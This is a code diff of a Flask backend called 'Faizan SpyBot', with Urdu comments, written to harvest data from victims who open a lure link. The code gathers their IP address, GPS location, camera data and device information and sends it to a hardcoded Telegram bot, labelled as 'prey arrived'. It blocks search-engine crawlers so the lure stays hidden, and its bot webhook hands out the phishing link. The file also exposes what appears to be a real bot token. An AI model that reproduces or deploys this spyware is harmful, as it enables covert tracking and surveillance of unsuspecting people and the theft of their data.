@@ -1,70 +1,77 @@
-from flask import Flask, request, render_template
-import json
+from flask import Flask, request, jsonify, abort
 import requests
-import os
-from datetime import datetime
 
 app = Flask(__name__)
 
+# ✅ آپ کے BOT کا TOKEN اور CHAT ID
 BOT_TOKEN = '7816397892:AAF6GslyJpBOv-ax4t5FdR-NOSOjESW1jMg'
 CHAT_ID = '6908281054'
 
+# ❌ Block known bots (Google, Bing, etc.)
+BLOCKED_BOTS = ['Googlebot', 'bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider', 'YandexBot', 'Sogou', 'Exabot']
+
+@app.before_request
+def block_bots():
+    ua = request.headers.get('User-Agent', '')
+    for bot in BLOCKED_BOTS:
+        if bot.lower() in ua.lower():
+            abort(403)
+
+# ✅ Telegram Spy Message Sender
 def send_to_telegram(message):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     payload = {
-        'chat_id': CHAT_ID,
-        'text': message,
-        'parse_mode': 'HTML'
+        "chat_id": CHAT_ID,
+        "text": message,
+        "parse_mode": "HTML"
     }
-    requests.post(url, data=payload)
+    try:
+        requests.post(url, json=payload)
+    except Exception as e:
+        print("❌ Telegram error:", e)
 
-@app.route('/')
-def index():
-    return render_template('gov.html')
-
-@app.route('/collect', methods=['POST'])
+# ✅ Spy Data Collector from frontend
+@app.route("/collect", methods=["POST"])
 def collect():
     data = request.get_json()
-    ip = request.remote_addr
-    ua = data.get("userAgent")
-    lat = data.get("latitude")
-    lon = data.get("longitude")
-    cam = data.get("camera")
-    device = data.get("deviceInfo")
 
-    message = f"""👁️ شکار آیا!
-🌐 IP Address: {ip}
-📱 Device: {ua}
-📍 Location: {'❌ Location Not Available' if not lat else f"{lat}, {lon}"}
-📷 Camera: {cam}
-🧠 Device Info: {device}
-⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"""
+    user_ip = request.remote_addr
+    user_agent = data.get("userAgent", "Unknown")
+    device_info = data.get("deviceInfo", "Unknown")
+    latitude = data.get("latitude", "❌ Location Not Available")
+    longitude = data.get("longitude", "❌ Location Not Available")
+    camera = data.get("camera", "❌ Camera Denied")
 
-    send_to_telegram(message)
+    location_info = f"📍 Location: {latitude}, {longitude}" if latitude != "❌ Location Not Available" else "📍 Location: ❌ Not Available"
 
-    # Save locally
-    with open('victims.json', 'a') as f:
-        f.write(json.dumps(data) + '\n')
+    msg = f"""👁️ <b>شکار آیا!</b>
+🌐 <b>IP Address:</b> {user_ip}
+📱 <b>Device:</b> {user_agent}
+{location_info}
+📷 <b>Camera:</b> {camera}
+🧠 <b>Device Info:</b> {device_info}
+    """
+    send_to_telegram(msg)
+    return jsonify({"status": "✅ Received"})
 
-    return '✅ Info Received'
-
-if __name__ == '__main__':
-    app.run(debug=True)
-
-# === Telegram Webhook ===
-@app.route(f"/{BOT_TOKEN}", methods=['POST'])
+# ✅ Telegram Bot Webhook
+@app.route(f"/{BOT_TOKEN}", methods=["POST"])
 def telegram_webhook():
     update = request.get_json()
     if "message" in update:
         chat_id = update["message"]["chat"]["id"]
-        if update["message"].get("text") == "/start":
+        text = update["message"].get("text", "")
+        if text == "/start":
             requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={
                 "chat_id": chat_id,
                 "text": "👋 خوش آمدید!\n👇 نیچے دیے گئے لنک پر کلک کریں:\nhttps://faizan-spybot.onrender.com"
             })
-    return "ok", 200
+    return jsonify({"status": "✅ Handled"})
 
-# === Run the App ===
+# ✅ Default Route
+@app.route("/")
+def home():
+    return "✅ Faizan™ SpyBot is Live"
+
 if __name__ == "__main__":
-    port = int(os.environ.get("PORT", 10000))
-    app.run(host="0.0.0.0", port=port)
+    app.run(host="0.0.0.0", port=10000)
